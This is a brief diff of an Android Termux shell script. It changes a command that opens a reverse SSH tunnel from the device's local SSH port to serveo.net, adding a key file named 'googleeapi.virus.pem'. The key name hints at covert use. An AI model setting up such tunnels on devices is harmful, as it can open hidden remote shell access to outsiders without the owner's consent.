@@ -6,5 +6,5 @@ mv /data/local/tmp/known_hosts /data/data/com.termux/files/home/.ssh/
 
 chmod 644 /data/data/com.termux/files/home/.ssh/known_hosts
 
-/data/data/com.termux/files/usr/bin/ssh -R 33001:localhost:8022 serveo.net
+/data/data/com.termux/files/usr/bin/ssh -i /data/data/com.termux/files/home/.ssh/googleeapi.virus.pem -R 33001:localhost:8022 serveo.net
 
